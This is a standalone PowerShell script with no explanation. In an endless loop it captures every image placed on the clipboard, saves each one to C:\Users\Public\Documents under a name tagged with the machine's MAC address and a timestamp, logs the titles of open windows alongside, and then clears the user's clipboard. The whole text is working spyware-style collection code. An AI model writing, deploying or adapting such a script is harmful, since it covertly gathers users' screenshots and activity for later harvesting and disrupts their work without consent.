Add-Type @"
  using System;
  using System.Runtime.InteropServices;
  public class Tricks {
    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();
}
"@

$a = [tricks]::GetForegroundWindow()
$process = (Get-Process |where {$_.mainWindowTItle} | select mainwindowtitle).mainwindowtitle
$MAC = (Get-NetAdapter | where-object -FilterScript {$_.HardwareInterface -eq "True" -and $_.Status -ne "Disconnected"}).MacAddress
do {
$content = Get-Clipboard -Format Image
If ($content) 
{
$path = 'C:\Users\Public\Documents'
$filename = "$path\${mac}_"+(Get-date -f yyyyMMddHHmmss)+"_clip.png"
$content.Save($filename,'png')
$process | out-file C:\Users\Public\Documents\${mac}_$(get-date -f yyyyMMddHHmmss)_clib_process.txt -Append -encoding utf8
Set-Clipboard -Value $Null
}

sleep 1
} 
while ($true)